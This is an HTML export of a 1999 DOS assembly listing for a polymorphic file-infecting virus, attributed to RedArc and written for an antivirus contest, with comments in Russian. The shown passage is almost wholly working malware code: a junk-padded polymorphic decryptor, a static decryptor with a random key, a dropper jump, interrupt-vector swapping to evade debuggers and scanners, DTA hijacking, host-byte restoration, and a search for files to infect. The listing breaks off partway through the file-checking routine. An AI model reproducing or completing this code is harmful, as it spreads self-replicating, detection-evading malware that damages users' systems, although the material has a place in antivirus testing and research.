<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; V++ полуморфик для третьего тура конкурса на лучший антивирус</span><span class="sc0">
</span><span class="sc1">; (c) 1999 by RedArc</span><span class="sc0">

</span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">

</span><span class="sc5">Model</span><span class="sc0"> </span><span class="sc10">Tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Начальные байты программы</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;В точке, где нашли IntXX</span><span class="sc0">
</span><span class="sc5">Resume</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">MyLabel</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@VirusStart</span><span class="sc0">
</span><span class="sc1">;Окончание программы</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">;!!! отсюда в произвольном порядке размещаются блоки декриптора</span><span class="sc0">
</span><span class="sc5">@VirusStart</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc0">     </span><span class="sc1">;Сохранение в стэке адреса возврата</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;!!! ДРОППЕР !!!</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EntryPoint</span><span class="sc0">
</span><span class="sc1">;!!! ДРОППЕР !!!</span><span class="sc0">

       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L0</span><span class="sc0"> </span><span class="sc1">;переход на следующий блок</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">L0</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint</span><span class="sc0"> </span><span class="sc1">;Пихаем в стек адрес перехода после дешифровки</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@a</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@a</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">L1</span><span class="sc0"> </span><span class="sc1">;Адрес начала цикла, случайное количество раз</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">@b</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc10">@b</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">L1</span><span class="sc0"> </span><span class="sc1">;Адрес начала цикла, случайное количество раз</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@c</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@c</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0"> </span><span class="sc1">;Начальный ключ дешифровки. Случайное число</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L1</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@d</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@d</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirLength</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@e</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@e</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L2</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">L2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc10">@f</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@g</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@g</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@h</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@h</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@i</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@i</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@i1</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Однобайтовая случайная команда</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Однобайтовая случайная команда</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L2</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Однобайтовая случайная команда</span><span class="sc0">
</span><span class="sc5">@i1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L3</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4321h</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;Случайное количество байт мусор первого рода</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">;!!! Осюда начинается зашифрованная часть кода</span><span class="sc0">
</span><span class="sc5">EntryPoint</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;!!! Статический декриптор со случайным ключем</span><span class="sc0">
</span><span class="sc1">; Это нужно для того, чтобы ключ в полидекрипторе был случайным</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">CryptStart</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">KeyStat</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0"> </span><span class="sc1">;Случайный ключ для статического декриптора</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">CryptLength</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">@EP_Start</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@EP_Start</span><span class="sc0">
</span><span class="sc5">CryptStart</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@CS</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IntExchange</span><span class="sc0">
</span><span class="sc1">;***</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">@TestFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
</span><span class="sc1">;***</span><span class="sc0">
</span><span class="sc5">GET_DTA</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">     </span><span class="sc1">;Получить DTA программы</span><span class="sc0">
</span><span class="sc5">SAVE_DTA</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_SEG</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Сохранить сегмент DTA программы</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_OFS</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">;Сохранить смещение DTA программы</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">      </span><span class="sc1">;Восстановить значение сегмента ES</span><span class="sc0">
</span><span class="sc5">SET_DTA_VIR</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">     </span><span class="sc1">;Установить DTA вируса</span><span class="sc0">
</span><span class="sc5">RESTORE_3_BYTES</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Восстановление спрятанных байт программы</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">OLD_BYTES</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">JMP_OFS</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movsw</span><span class="sc0">
       </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">FIND_FIRST</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">FileMask</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0"> </span><span class="sc1">;Поиск первого файла по шаблону</span><span class="sc0">
</span><span class="sc5">Interrupt</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NotFile</span><span class="sc0">
</span><span class="sc1">;***</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
</span><span class="sc1">;       call TestFile</span><span class="sc0">
</span><span class="sc1">;***</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Interrupt</span><span class="sc0">
</span><span class="sc5">NotFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Ну делать нечего... пора отдавать брозды правления.</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_SEG</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_OFS</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IntExchange</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">IntExchange</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Обмен векторов 21h и 3h</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">IntConst</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Это скажите спасибо CrkV - это все он... ;)</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">IntConst</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">sti</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">@TestFile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
</span><span class="sc5">TestFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Проверка найденного файла на соответствие критериям вируса</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitTest</span><span class="sc0"> </span><span class="sc1">;Больше 65536 байт</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">
